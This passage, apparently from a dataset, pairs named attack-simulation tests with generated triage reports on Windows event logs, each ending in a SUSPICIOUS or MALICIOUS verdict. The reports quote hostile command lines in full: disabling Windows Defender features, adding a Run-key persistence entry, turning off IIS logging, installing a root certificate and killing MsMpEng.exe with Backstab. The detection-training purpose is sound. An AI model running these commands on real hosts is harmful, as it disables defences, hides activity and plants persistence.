   - **whoami.exe** and **hostname.exe** executed, which are benign by themselves but might be used by an attacker to gather system info once gaining initial access.

3. **Scheduled Task Creation**:
   - **schtasks.exe** is invoked to create a scheduled task to call PowerShell with a bypass execution policy. This is a strong indicator of potentially malicious activity as it combines scheduled tasks and PowerShell script execution.

4. **System Integrity & Security Products**:
   - Windows Defender status is active (`SECURITY_PRODUCT_STATE_ON`), indicating baseline security protections are in place.
   - Security updates for Microsoft Defender Antivirus completed successfully, suggesting an up-to-date antivirus system.

5. **Network and Other Activities**:
   - No unusual network activities or external connectivity attempts are present in the logs, as they are not part of the provided event logs.

6. **Security Logs**:
   - Multiple credential operations related to MicrosoftAccount failed, returning a status `3221226021`. These could indicate issues with authentication attempts or potential enumeration efforts by malicious actors.

#### Assessment:

- **Scheduled Task and PowerShell Execution**: The creation of a scheduled task to execute a PowerShell script with bypass policies for execution hint at potential lateral movement or persistence strategies commonly associated with malicious activity.
  
- **Repeated Execution of Certain Tools**: The repeated and successive execution of administrative tools such as `wevtutil.exe`, `conhost.exe`, and the use of `cmd.exe` with specific scripting flags (bypass) further support the suspicion.

#### Guidance on How to Proceed:

1. **Immediate**:
   - Check the source of the `cmd.exe` command that created the scheduled task and investigate the origin of this command. Verify if similar scheduled tasks exist on the system.
   - Validate if `c:\\data.004_NonExistingScript.ps1` has existed in previous backups or through logs for further investigation.

2. **Investigative**:
   - Examine user `SERVER002\\admin_test` activities in more detail and its privileges. Analyze if there have been any correlated suspicious actions or elevated privileges.
   - Monitor other systems in the network for similar patterns or connections to this potentially malicious host.

3. **Preventive**:
   - Audit the systems for active services and scheduled tasks for potential manipulations. 
   - Strengthen logging and detection mechanisms specifically for cmd, PowerShell executions, and scheduled tasks.

### Final Resolution: **SUSPICIOUS**

The logs present potentially suspicious activities that require deeper investigation to rule out or confirm a compromise."
Abusing MyComputer Disk Fragmentation Path for Persistence,"### Analysis

Upon reviewing the provided Windows event logs, several aspects need to be scrutinized to ascertain signs of anomalous or malicious behavior:

1. **Sysmon Logs:**
   - Several instances of known legitimate processes, such as `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `hostname.exe`, are executed by the user `SERVER002\\admin_test` with a high integrity level. 
   - The command execution patterns for utilities like `hostname.exe` and `whoami.exe` appear typical except potentially for high frequency or repeat entries, which in itself is not necessarily malicious without context of user activity.
   - An execution of `cmd.exe` with a command modifying a registry value to change the DefragPath to `notepad.exe` is performed. Altering registry settings, particularly those related to system defaults, is generally a suspicious action that could indicate malicious activity such as persistence or privilege escalation attempts.
   - Normal activities are observed for legitimate system services such as `svchost.exe` and updates for Microsoft services, which typically run with `NT AUTHORITY\SYSTEM` privileges.

2. **System and Application Logs:**
   - Time synchronization events and Edge update service entries appear regular and consistent with legitimate operations.
   - There are no distinct or overtly suspicious entries within the system and application logs outside the context provided by Sysmon logs.

3. **Security Logs:**
   - Security logs show normal time change adjustment logs indicative of system updates or synchronizations, typical for situations involving time services adjusting system time.

### Assessment and Resolution

- The activity involving normal execution of utilities such as `wevtutil.exe`, `hostname.exe`, `conhost.exe`, and `whoami.exe` indicates benign actions when viewed collectively, assuming these match routine system operations or administrative functions.
- The core concern lies with the registry modification via command line executed through `cmd.exe`. Tampering with system registry paths to invoke a different application like `notepad.exe` can be a vector for malware persistence or configuration hijacking.
- Other legitimate system updates and service operations (e.g., Microsoft Edge Update) do not exhibit signs of tampering and follow patterns expected for update processes.
  
Given the analysis, the presence of the registry modification action merits further attention and potentially correlates with an attack vector. However, due to the lack of additional corroborative malicious entries, the overall categorization is determined to be one level cautionary step below outright malicious.

### Final Resolution

- **SUSPICIOUS**: The registry modification via `cmd.exe` qualifies as suspicious activity, necessitating further investigation due to its potential for abuse in a malware campaign or misconfiguration. Other log entries are assessed as typical or requiring contextual operational knowledge for benign activities. It is recommended to conduct a follow-up review of system integrity, cross-reference with threat intelligence, and confirm if similar changes occurred elsewhere or were executed by known trusted users."
Execute base64-encoded PowerShell,"After analyzing the provided event logs, here is a detailed breakdown of suspicious and potentially benign activities:

1. **Repeated use of `wevtutil.exe` and `conhost.exe`:** The logs show multiple instances of `wevtutil.exe` and `conhost.exe` being executed in a short span of time. While `wevtutil.exe` is a legitimate Windows utility used to view and manage event logs, its frequent invocation may indicate log manipulation attempts by an unauthorized user. Similarly, `conhost.exe` is a normal process but could also be associated with command-line activity.

2. **Scheduled Tasks and System-Related Executions:**
   - Various system processes like `svchost.exe`, `taskhostw.exe`, `MusNotification.exe`, and `UsoClient.exe` are seen performing typical system functions.
   - Event logs related to Microsoft Edge update processes and other system tasks like `CompatTelRunner.exe` and `WaaSMedicAgent.exe` appear regular. These can be attributed to software updates or telemetry data collection.

3. **PowerShell Execution:**
   - There are PowerShell logs indicating execution with encoded commands (Base64 encoding). Such PowerShell activity is crucial as encoded commands are often used to obfuscate malicious scripts.
   - The decoded command (`VwByAGkAdABlAC0ASABvAHMAdAAgACIASABlAHkALAAgAEEAdABvAG0AaQBjACEAIgA=`) translates to a benign script: `Write-Host ""Hey, Atomic!""`. This suggests that this particular execution was not harmful.

4. **Privilege Escalation Events:**
    - Security logs indicate that an elevated token was used (`EventID: 4672`). This could be a routine privilege escalation inherent to system processes but needs scrutiny to ensure this elevation didn't bypass security controls.

5. **Windows Security Logs:**
   - Numerous `EventID: 5379` logs denote credential checks which repeatedly failed (`ReturnCode: 3221226021`). Repeated failures may hint at an unauthorized user attempting to access specific accounts or services.

**Assessment and Conclusion:**
- The repetitive execution of `wevtutil.exe` suggests potential log manipulation or inspection without clear justification.
- PowerShell use with encoded commands, while benign in output, shows the environment is used for scripting, which can be misused.
- The system and security processes logged exhibit typical behavior for software maintenance and telemetry but should be reviewed in context.
- The failed credential logins in security logs raise concern about unauthorized access attempts.

**Resolution: SUSPICIOUS**
- The activities require further investigation, particularly around the repeated execution of administrative tools and failed security credential attempts.
- It would be prudent to verify the intentions behind running PowerShell scripts and to audit logs for any further potential tampering indications.
- Monitoring of user activities and additional endpoint detection tools should be utilized to capture suspicious behavior proactively.
In summary, the collected logs have elements indicative of potential attempts at unauthorized actions but do not provide definitive proof of compromise. Further analysis and monitoring are recommended to ensure there's no malicious activity or breach."
User scope COR_PROFILER,"### Analysis:

#### Suspicious or Anomalous Behavior:
1. **PowerShell Activity**: 
   - The logs indicate extensive use of PowerShell for creating registry keys, setting environment variables, and launching the `eventvwr.msc` via `mmc.exe`. Generally, these activities are typical of various fileless malware attacks. Techniques often involve using PowerShell to manipulate the Windows Registry and launch applications like Event Viewer for malicious purposes.
   - Notably, the creation of registry keys under `HKCU:\Software\Classes\CLSID\{...}` pointing to a DLL `data.012x64.dll`, stored in a temporary folder, and setting up environment variables related to profiling (`COR_ENABLE_PROFILING`, `COR_PROFILER`, `COR_PROFILER_PATH`) are common for persistence mechanisms used by malware.

2. **Execution Chain**:
   - The PowerShell log indicates the script was started with `powershell.exe & { ... }`, a sign that the command might be obfuscated or part of a larger script executed within this process chain.
   - Execution of binaries such as `mmc.exe EVENTVWR.MSC` from PowerShell, especially after suspicious registry modifications, is indicative of behavior consistent with bypassing User Account Control (UAC).

3. **Sysmon Logs**:
   - Several processes listed in the Sysmon logs as executed by `SERVER002\admin_test`. These include potential misuse of legitimate system binaries (`conhost.exe`, `wevtutil.exe`, `wsmprovhost.exe`) which can be leveraged for various malicious purposes.
   - Creation of processes like `mmc.exe EVENTVWR.MSC` directly ties to the aforementioned suspicious PowerShell activity, building a case for possible UAC bypass scenario.
   - Parallel to suspicious PowerShell activities, System process `TiWorker.exe` and binaries within `WinSxS`, `MicrosoftEdgeUpdate.exe`, and `WmiPrvSE.exe` are invoked. However, these appear typical for system updates or regular activities under NT AUTHORITY\SYSTEM, showing less immediate cause for concern without further context.

#### Indicators of Malicious Activity:
1. **DLL Injection/Persistence**:
   - The script inserts a DLL into a temporary directory and configures profiling paths in environment variables, indicating likely intent for persistence or code injection into legitimate processes.
2. **Potential UAC Bypass**:
   - Utilization of `eventvwr.msc` post PowerShell script execution hints at exploiting a known UAC bypass technique where Event Viewer is used to execute commands with elevated privileges.
3. **Command Lines/Execution Patterns**:
   - The entire sequence of using `powershell.exe`, `eventvwr.msc`, and registry modifications points strongly towards a methodical compromise tactic.

### Assessment:
- The execution of specific command lines to manipulate registry keys, set profiling environment variables, and launch `eventvwr.msc` through PowerShell, in conjunction with handling of DLLs, suggests deliberate actions indicative of a malicious operation.

### Resolution:
- **MALICIOUS**: The logs contain strong indicators of malicious activity, specifically targeting registry manipulation, DLL injection, and privilege escalation techniques.

### Guidance:
- **Immediate Actions**:
  - Investigate and manually inspect the DLL (`data.012x64.dll`) found in the temporary directory to confirm its purpose and origin.
  - Inspect the integrity and the intended configurations of registry entries in `HKCU:\Software\Classes\CLSID\` to determine if they conform to expected norms.
  - Consider isolating the machine for forensic analysis and to prevent further compromise.
- **Further Investigation**:
  - Seek additional context on activities tied with `admin_test` account to uncover further unauthorized actions.
  - Review systems deployed with similar configurations for similar patterns or persistence indicators.
- **Prevention**:
  - Review and tighten scripting and execution policies for PowerShell on company machines.
  - Evaluate and enhance monitoring around registry changes, especially those indicating profiling or code injection tactics.

Given the nature of suspicious PowerShell scripting and execution, and the consistent patterns involving potentially harmful configurations, the threat should be treated as significant with rapid action to mitigate risk."
Disable Windows IIS HTTP Logging,"Upon reviewing the provided log entries, we can observe the following:

1. **Usage of Common Utilities:**
   - There are entries indicating the execution of common utilities like `hostname.exe`, `conhost.exe`, `whoami.exe`, `wevtutil.exe`, and `powershell.exe`.
   - The presence of `whoami.exe` and `powershell.exe` could indicate benign actions or initial reconnaissance/post-exploitation activities depending on the context and user behavior.
   - `powershell.exe` is executed with a command to modify IIS logging settings (`appcmd.exe set config ""Default Web Site"" /section:httplogging /dontLog:true`), which can be suspicious as it attempts to disable logging for the web server.

2. **PowerShell Logging:**
   - The PowerShell logs confirm the execution of the command that attempts to modify web server configuration using `appcmd.exe`. The act of disabling logging can be an indicator of evasion or an attempt to hide further actions on the server, suggesting potential malicious intent.

3. **Multiple Software Update Related Entries:**
   - There are numerous entries for Microsoft Edge update processes (`MicrosoftEdgeUpdate.exe`) and related components. These entries appear to be routine updates and show typical behavior during software updates.

4. **System Time Changes:**
   - The logs indicate that the system time was updated, which matches typical behaviors where services update or sync the system time with a time source like `time.windows.com`.

5. **Security and System Logs:**
   - These logs do not indicate unusual behaviors or events directly correlated with unauthorized access or activities, but they do show normal service operations and system events.

**Assessment and Conclusion:**

Overall, while most of the entries appear benign or associated with routine system operations, the execution of PowerShell to disable IIS logging is concerning. Disabling web server logging can be a tactic used to prevent the detection of further, potentially malicious activities. Although this single action does not confirm a full compromise on its own, it raises a red flag that warrants additional investigation.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
- Further investigate the context and user behavior leading up to the PowerShell command execution to understand whether it was authorized or expected in the environment.
- Review IIS logs to check for any unusual activities or access patterns that might indicate exploitation or data exfiltration attempts.
- Monitor or audit other systems for similar behavior to ensure this is not part of a larger coordinated attempt.
- Ensure logging and monitoring mechanisms are intact and not tampered with, and consider bolstering security controls around critical servers."
DLL Side-Loading using the Notepad++ GUP.exe binary,"Upon reviewing the provided Windows event logs, several observations can be made. Below is a detailed analysis of the logs with respect to any suspicious or anomalous behavior:

### Analysis of Logs

1. **Sysmon Logs**
   - **Frequent Execution of System Utilities**: There are multiple entries where system utilities such as `powershell.exe`, `wevtutil.exe`, and `conhost.exe` are executed almost simultaneously. The processes were run by the user `SERVER002\admin_test`. 
   - **Execution of `cmd.exe` with GUP.exe**: The execution of `cmd.exe` with the command line containing `GUP.exe` in a temporary directory is noteworthy. `GUP.exe` is identified as a component of Notepad++ update mechanism, which could be legitimate if Notepad++ is installed and updates are expected. However, the path in a temporary directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.002\\bin\\GUP.exe`) could potentially indicate non-standard behavior that requires further investigation.
   - **Microsoft Edge Updates**: A large number of the events are related to processes concerning Microsoft Edge updates. These processes appear to be legitimate, involving the update and registration of Microsoft Edge components as per their filenames and command-line arguments. They are executed under `NT AUTHORITY\\SYSTEM` with high integrity levels, aligning with standard update behavior.

2. **Edge Update Service Stopped**: The application log shows a ""Service stopped"" entry for `edgeupdate`, which is a routine behavior suggesting that the update service was stopped after performing its tasks, likely related to Edge updates mentioned in the Sysmon logs.

### Indicators of Potentially Suspicious Activity

- **Activity Tied to `GUP.exe` in Temp Directory**: Even though `GUP.exe` is part of Notepad++, its presence in a temporary directory with execution via `cmd.exe` could be flagged for further scrutiny. This setup is not typical for most regular software updates and might indicate either a scheduled update or a malicious attempt to disguise payload delivery.

### Overall Assessment

- **BENIGN**: The majority of the logs, especially those related to Microsoft Edge updates, are consistent with routine and expected system behaviors.
- **SUSPICIOUS**: The execution of `GUP.exe` from a temporary directory raises suspicion and requires additional verification to confirm whether this execution is part of a legitimate update process or associated with malicious activity.

### Resolution

**SUSPICIOUS**

### Guidance for Further Actions

1. **Verify Notepad++ Presence**: Confirm whether Notepad++ is installed on the system and whether an update was indeed scheduled or expected around the time these logs were generated.
2. **Validate `GUP.exe`**: Check the origin and integrity of the `GUP.exe` file. Compare its hash with the expected hash for a legitimate version distributed by Notepad++.
3. **Review Update Logs**: Cross-reference system update logs and third-party update settings for Notepad++ to corroborate or disprove the legitimacy of the `GUP.exe` execution event.
4. **Conduct Network Analysis**: Investigate network logs for any unusual outgoing connections or data transfers that might coincide with the suspicious execution.

By following these steps, you can better determine whether the suspicious activity represents a genuine threat or benign behavior."
Disable Windows Defender with PwSh Disable-WindowsOptionalFeature,"## Detailed Analysis

### 1. **PowerShell Activity**
The PowerShell logs show multiple instances of commands that involve disabling features related to Windows Defender. The command line in the logs is:
```shell
powershell.exe & {Disable-WindowsOptionalFeature -Online -FeatureName ""Windows-Defender-Gui"" -NoRestart -ErrorAction Ignore
Disable-WindowsOptionalFeature -Online -FeatureName ""Windows-Defender-Features"" -NoRestart -ErrorAction Ignore
Disable-WindowsOptionalFeature -Online -FeatureName ""Windows-Defender"" -NoRestart -ErrorAction Ignore
Disable-WindowsOptionalFeature -Online -FeatureName ""Windows-Defender-ApplicationGuard"" -NoRestart -ErrorAction Ignore}
```
Disabling security features, including Windows Defender, is highly suspicious, particularly without an immediate and legitimate explanation. This behavior suggests an attempt to undermine the host's security defenses, which can be a precursor to malicious activity.

### 2. **Sysmon Activity and Process Execution**
- **Processes Executed**: Multiple instances of common Windows utilities such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `DismHost.exe` were executed. While the use of utilities like `hostname.exe` and `whoami.exe` can be part of normal administrative activities, alongside the suspicious PowerShell commands, this raises concerns about possible reconnaissance or system enumeration by an unauthorized entity.
- **Microsoft Edge Updates**: There are repeated updates and execution of components related to Microsoft Edge. While frequent updates are not inherently suspicious, the presence of numerous processes executing within short intervals could merit further review to ensure no exploitation of these processes. However, the context here seems to be consistent with a legitimate update process.

### 3. **Application and System Log Activities**
The application logs contain entries for normal system activities such as service stops, with no immediate indication of compromise. Edge update activities appear regular. There is a Software Protection Platform entry which seems routine.

### 4. **Conclusion on the Malicious Nature**
While some of the processes and services observed could fall within normal operational bounds by an administrator, the PowerShell activity of disabling Windows Defender features represents a direct attack on the system’s defensive security mechanisms. This type of activity strongly aligns with behavior typically seen in malicious operations where the objective is to disable security features to allow for further compromise or exploitation.

## Threat Assessment and Conclusion:
- **Threat/Risk Identified**: Disabling of Windows Defender components signifies an attempt to weaken system protections. In the absence of a clear, legitimate reason for these actions, they suggest malicious intent.
- **Resolution**: **MALICIOUS**

### Guidance on How to Proceed:
1. **Immediate Isolation**: The host in question should be isolated from the network to prevent further potential malicious activity.
2. **Comprehensive System and Network Sweep**: Conduct a thorough review of network activity and connections to the impacted host to identify any other potentially compromised systems or malicious communications.
3. **Implement Logging and Monitoring**: Increase the logging level on the affected machine and closely monitor for any further suspicious activity.
4. **Review Administrator Actions**: Verify if any recent administrative activities could explain the PowerShell commands and ensure all administrative actions are verified and logged.
5. **System Clean-Up and Restoration**: Use known clean backups to restore the system to a secure state if an in-depth forensic investigation reveals no other option.

Depending on access, establish more robust security measures like Endpoint Detection and Response (EDR) tools and ensuring all software is concurrently updated and patched."
Install root CA on Windows,"**Analysis of Logs**

Based on the provided logs, several activities stand out that are potentially suspicious. These will be detailed below:

**Security Logs:**
- **Event ID 4624 and 4672**: These events indicate successful logons and special privileges assignment to the System account. While common, such activity might be leveraged in an attack where an adversary manages to leverage system-level accounts for unauthorized purposes.

- **Event ID 5379**: Multiple failed retrieval attempts of credentials related to Microsoft accounts and Windows Live tokens appear suspicious. The consistent failure (ReturnCode: 3221226021 indicates STATUS_NO_SUCH_LOGON_SESSION) may either indicate misconfiguration or attempts to access unauthorized data.

**Sysmon Logs:**
- **Usage of PowerShell**: There are multiple instances where PowerShell was executed by an account named ""admin_test"". Particularly, there is a command involving certificate import and manipulation:
  - `powershell.exe & {$cert = Import-Certificate -FilePath rootCA.cer -CertStoreLocation Cert:\LocalMachine\My, Move-Item -Path $cert.PSPath -Destination ""\""Cert:\LocalMachine\Root\""""}`
  This activity could be a benign administrative task, but without more context, it could also imply an attempt to introduce a trusted root certificate unauthorizedly, which might be used for man-in-the-middle attacks.

- **Frequent execution of `wevtutil.exe`**: This utility is used to manage and query event logs. Its frequent execution could indicate potential log manipulation activities, which adversaries might perform to cover their tracks.

- **Associated Processes**: Numerous executions of `conhost.exe` associated with the above processes might indicate command-line interaction, consistent with scripting tasks and not inherently suspicious but worth noting.

**Windows PowerShell Logs:**
- These logs corroborate the execution of the PowerShell script regarding certificate handling. Detailed logging of the sequence reinforces the scripting nature of this activity.

**Application and System Logs:**
- These logs do not contain additional activity significantly outside normal system operations for the purposes of this analysis.

**Assessment:**
- **Suspicious Behavior**: The combination of failed credential retrievals, PowerShell activity related to certificate modifications, and frequent use of event log management tools suggests that the activity might not only contain legitimate administrative actions but also conceal potentially malicious behaviours. 

**Resolution:**
- **SUSPICIOUS**: The logs contain activity that raises concern and warrants further investigation. Specifically:
  - The PowerShell script modifying certificates should be closely examined to ensure its legitimacy.
  - Investigate the context and origin of the failed credential retrievals to ascertain whether they are due to configuration errors or unauthorized access attempts.
  - Review administrative tasks performed by the `admin_test` account to validate its intent and legitimacy.

**Guidance on How to Proceed:**
1. **Review PowerShell Scripts**: Analyze executed scripts to determine intent, and verify that all actions performed are authorized.
2. **Credential Security**: Check security configurations related to credential storage and retrieval, especially concerning Microsoft accounts and token management.
3. **Monitor Admin Accounts**: Increase the monitoring of the `admin_test` account for unusual activities and ensure it follows the principle of least privilege.
4. **Event Log Purity**: Ensure integrity and proper configuration of event logs to detect any potential tampering or suspicious activities.
5. **Further Investigation Tools**: Consider deploying additional logging tools such as EDR (Endpoint Detection and Response) to capture fine-grained activity that may have been missed."
Kill antimalware protected processes using Backstab,"After carefully analyzing the provided logs, here's a detailed breakdown of potential indicators of malicious activity:

### Analysis

1. **Sysmon Events**:
    - Multiple instances of PowerShell execution (`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`) by the user `SERVER002\admin_test`. This in itself can be normal; however, the command line argument is specified as `""powershell.exe"" & {& \""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\script64.exe\"" -k -n MsMpEng.exe}`.
    - The use of `..\Externalfiles\script64.exe` and the flags `-k` and `-n MsMpEng.exe` suggest possible execution of a suspicious or potentially malware-related script. The path location in a temporary file directory could indicate an attempt to evade detection.
    - The frequent and rapid execution of `wevtutil.exe` and `conhost.exe` can be normal but combined with the circumstances, they may suggest obfuscation tactics or attempts to manipulate event logs.
    - The execution of common reconnaissance commands like `HOSTNAME.EXE` and `whoami.exe` raises suspicion, especially when launched via a chain of processes stemming from suspicious PowerShell execution.

2. **PowerShell Logs**:
    - Log entries confirm the start and stop states of PowerShell provider operations aligned with the suspicious PowerShell commands that attempted to execute a script from a temporary directory.

3. **Application Events**:
    - The application logs show a typical Windows Defender state event and various Microsoft Edge update events which don't directly signal any malicious activity.

4. **Other Observations**:
    - There's repeated execution of operations and updates tied to Microsoft Edge Update processes which are typically benign if consistent with expected behavior and known update patterns.
  
### Conclusion
The presence of a script being executed from a temporary directory using PowerShell, particularly with named executable such as `script64.exe` targeting a system process (MsMpEng.exe), is highly indicative of suspicious behavior requiring further investigation. 

### Resolution: SUSPICIOUS

### Recommended Actions:
1. **Conduct a Detailed Forensic Analysis**:
   - Identify the `script64.exe` and analyze it to determine its purpose, origin, and risk level.
   - Conduct a memory dump analysis or engage a file integrity monitoring solution targeting the time frame of suspicious events.

2. **Review IAM Policies and User Activity**:
   - Verify the account `admin_test` is expected to execute such scripts and review for any indicators of compromised credentials or privilege misuse.

3. **Network and System Monitoring**:
   - Increase logging or alerting for PowerShell and wevtutil use across the network.
   - Determine if similar activities have been observed on other systems within the network.

4. **Quarantine and Contain**:
   - If any scripts or suspicious binaries are found, consider quarantining the machine and ensure containment to prevent lateral movement.

5. **Notify Security Operations Team**:
   - Raise an investigation alert with the SOC or appropriate security team to ensure monitoring and damage assessment continue.

This analysis indicates activities that merit further investigation rather than an immediate determination of maliciousness."
Execution of non-dll using rundll32.exe,"Based on the analysis of the provided logs, there are a few key observations worth noting:

1. **Kernel-General and Time Changes:**
   - There are several events indicating changes to the system time (`EventID: 1` from `Microsoft-Windows-Kernel-General` and `EventID: 4616` from `Microsoft-Windows-Security-Auditing`). While time changes can be legitimate, repeated and arbitrary time adjustments can be indicative of an attempt to manipulate time-based security controls or logs.

2. **PowerShell Activity:**
   - A PowerShell instance is running a command to execute `rundll32.exe` with the file `calc.png`. This is unusual as .png files are typically images and not executables or libraries. The command `rundll32.exe C:\\Users\\$env:username\\Downloads\\calc.png, StartW` appears to be trying to execute this image file as though it were a DLL, which is suspicious and indicative of potential malicious activity or an attempt to mask execution.

3. **Sysmon Logs and Process Executions:**
   - Various processes related to Microsoft Edge Update are running, which by itself is not suspicious as they are part of routine updates. However, these activities are mixed with other processes such as `whoami.exe`, `powershell.exe`, and `rundll32.exe` that are initiated within close temporal proximity.
   - The execution of `rundll32.exe` is linked to the PowerShell execution mentioned earlier, further supporting the suspicion of malicious activity.

4. **Security Log Entries:**
   - The security log entries primarily show successful logon events and associated privilege assignments which are normal for system operations. However, given the suspicious PowerShell execution, additional log analysis or contextual information might be warranted to confirm these are expected actions from authorized entities.

Overall, the primary concern in these logs is the suspicious use of PowerShell to execute an unlikely application scenario (`rundll32.exe` running a `.png` file), which aligns with common malicious techniques for executing code without traditional binaries. Additionally, frequent adjustments to system time and the lack of context on those actions could point towards attempts to obfuscate activities or evade detection mechanisms.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Immediately investigate the file `calc.png` for signs of embedded malicious code.
- Review the security policies and logs around PowerShell usage to ensure all PowerShell scripts are verified and trusted.
- Check system integrity to confirm no further compromise or persistent threats exist.
- Consider alerting relevant stakeholders and isolating affected systems if necessary to prevent the spread of potential malware."
Activate Windows NoDesktop Group Policy Feature,"Upon reviewing the supplied logs, several observations can be made:

### Application Log:
1. **Event ID 15** indicating Windows Defender is in a HEALTHY state (SECURITY_PRODUCT_STATE_ON).
2. **Event IDs 0** related to the stopping of the `edgeupdate` service may trigger questions if there were no scheduled updates. However, these are common occurrences when the update services check for updates periodically.

### System Log:
1. **Event ID 19** is indicative of a regular update through Windows Update Client for Security Intelligence related to Microsoft Defender Antivirus. This is typical maintenance activity.
2. **Event ID 1 & 24** show adjustments in system time, controlled by Windows Time Service. **Event ID 35** coincides, confirming synchronization with `time.windows.com`.

### Sysmon Log:
1. Series of **Event ID 5** indicate the execution of system processes like `wevtutil.exe`, `conhost.exe`, etc., by `SERVER002\admin_test`. This activity may indicate either regular administrative tasks such as managing event logs or potentially the unauthorized querying of system information.
2. **Event ID 1** logging processes involve Microsoft Edge updates. The EdgeUpdate service routinely runs updates, thus its appearance in the logs is expected.
3. A crucial point of interest is a **cmd.exe** process executing a registry modification command (`reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoDesktop /t REG_DWORD /d 1 /f`). This modifies Windows Explorer's behavior, potentially hiding desktop icons or taskbar - a common tactic used by malware to obscure system accessibility.

### Security Log:
1. **Event ID 4616** logging changes in system time akin to those documented in the System Log, show no erroneous behavior when the time corrections originate from the `svchost.exe` process managed by authorized services.

### Assessment and Resolution:
The registry modification observed in the Sysmon log presents suspicious behavior, given it alters system policies affecting desktop visibility. This activity could point towards attempts to conceal or disrupt ordinary desktop functionality, which could be exploited by certain types of malware to prevent user interference.

Given these considerations, the resolution is:
- **SUSPICIOUS** - The registry modification activity warrants investigation, particularly understanding why such a change was enacted and if it aligns with actions by authorized IT staff or scheduled administrative processes. Immediate action is recommended to trace and verify authorizations for the observed command usage.

**Next Steps**: 
- Conduct user and process audits focusing on `admin_test` actions. 
- Evaluate system for additional indicators of potential compromise, such as network connections, and anomalous file activity, especially related to unauthorized registry or policy alterations.
- Review security policies in place and consider enhanced monitoring or restriction of high-risk commands."
Windows Modify Show Compress Color And Info Tip Registry,"### Detailed Analysis:

1. **PowerShell Log:** There is no data provided from the PowerShell log, which prevents any analysis from this particular source of logs.

2. **Application Log:**
   - **EdgeUpdate Service Stopped:** There are two entries indicating that the `edgeupdate` service stopped without any subsequent restart noted. This may require further investigation to ensure it resumes as expected, as its stoppage during an update could lead to incomplete installations or security patches.

3. **System Log:**
   - **Windows Time Service:** A time source was selected from `time.windows.com`. This is a standard operation of the time service and does not appear suspicious.

4. **Sysmon Log:**
   - **Repeated Execution of System Utilities:** Frequent usages of `wevtutil.exe` and `conhost.exe` by the account `SERVER002\admin_test` is observed in quick succession. `wevtutil.exe` is a command-line utility used to manage event logs, and `conhost.exe` is a console window host process. If these don't align with routine administrative activities, it might be indicative of an unauthorized review or manipulation of event logs.
   - **Execution of `cmd.exe`:** There is a notable usage of `cmd.exe` with arguments to modify the Windows registry under `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced`. The changes deal with user interface settings (`ShowInfoTip` and `ShowCompColor`), which don't directly suggest malicious behavior but could denote unauthorized configuration changes, especially if this wasn’t sanctioned changes or maintenance.
   - **EdgeUpdate Activity:** There are multiple executions of `MicrosoftEdgeUpdate.exe` processes across various directories and executions. These exhibit normal behavior for updating Microsoft Edge, involving the installation of the update service (`/svc`), setup files, and registration commands (`/regserver`). The permissions and user context (NT AUTHORITY\SYSTEM) appear legitimate, indicating this activity is likely benign.
   - **Other Processes (`whoami.exe`, `svchost.exe`, `sppsvc.exe`, etc.):** The execution of these processes is typical within a Windows environment and doesn't indicate any anomalous activity without additional suspicious context.
   - **Registry Tool `reg.exe`:** The instances of registry updates call for a review of the decision-makers and reasoning for those specific changes.
  
5. **Security Log:** There were no entries provided in the Security log section, limiting the ability to assess any logon events or suspicious authentications.

### Conclusion:

Based on the provided logs, frequent executions of `wevtutil.exe` and `conhost.exe` alongside registry modifications could represent suspicious behavior if these actions are unexplained by routine administrative tasks. The EdgeUpdate logs appear normal and reflective of update operations for Microsoft Edge.

### Recommendation:

- **Resolution:** SUSPICIOUS
- **Actionable Steps:**
  - Verify if the `admin_test` account executed the events within an expected maintenance window.
  - Confirm the legitimacy of the registry changes with corresponding changes, approvals, or update/migration tasks.
  - Ensure the `edgeupdate` service resumes correctly unless administrative changes purposely stopped it.
  - Investigate the processes further to distinguish between legitimate administrative activity and potential unauthorized actions."
Modify Registry of Local Machine - cmd,"### Analysis of the Windows Event Logs:

Upon examining the provided Windows event logs, several points stand out as potentially suspicious, indicative of unusual activity on the system. The core findings are outlined below:

1. **Frequency and Pattern of Process Executions:**
   - There are multiple executions of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test`. While `wevtutil` is a legitimate utility to interact with event logs, its frequent invocation without an administrative context raises suspicion.
   - The invocation of `HOSTNAME.EXE` and `whoami.exe` in quick succession, while both legitimate Windows utilities, might suggest a script-driven or automated sequence of actions, which is often indicative of reconnaissance activity by a threat actor.

2. **Registry Modifications:**
   - A potentially malicious action is observed with the execution of the command:
     - `cmd.exe /c reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /t REG_EXPAND_SZ /v SecurityHealth /d calc.exe /f`
     - This command would add ""calc.exe"" to the run key in the registry, which automatically executes specified applications during startup. This is a known persistence technique often used by malware.

3. **Process Integrity and Execution Context:**
   - The integrity level of the processes executed primarily remains high, which is standard for administrative or system processes but could also point to a user with high privileges performing potentially malicious actions.

4. **Microsoft Edge Update Executions:**
   - A significant number of entries relate to `MicrosoftEdgeUpdate.exe`. These could be routine updates or installations; however, the installer being executed from a temporary directory raises some questions on its authenticity or intent:
     - Example: `C:\\Program Files (x86)\\Microsoft\\Temp\\EUBC9F.tmp\\MicrosoftEdgeUpdate.exe`
   - The fact that these are executed under `NT AUTHORITY\SYSTEM` indicates high privilege execution, which is typical for legitimate updates yet remains a point for further verification.

### Assessment of the Situation:

- **Primary Concern:** The registry addition command detected is a red flag indicative of a persistent mechanism being set by potentially unauthorized or malicious means. This, combined with certain rapid process executions, suggests abnormal system behavior.
- **Threat/Risk Identified:** Given the presence of registry manipulations for persistence and the potential misuse of privileges, the environment could be at risk of malware persistence or unauthorized administration activities.
  
### Guidance on How to Proceed:

- **Immediate Actions:**
  - Verify the legitimacy of the actions performed by the account `SERVER002\admin_test`. Ensure that these activities were part of regular operations or maintenance.
  - Conduct a comprehensive security review to identify any unauthorized changes, particularly focusing on startup items, scheduled tasks, and persistent mechanisms.
  - Audit the system for any signs of compromise, such as unauthorized file changes or unexpected network communications.
  - Remove or quarantine the registry entry that launches `calc.exe` on startup until a proper justification or resolution is determined.

- **Long-Term Recommendations:**
  - Enhance monitoring for registry changes and process executions, especially for high integrity and system-level processes.
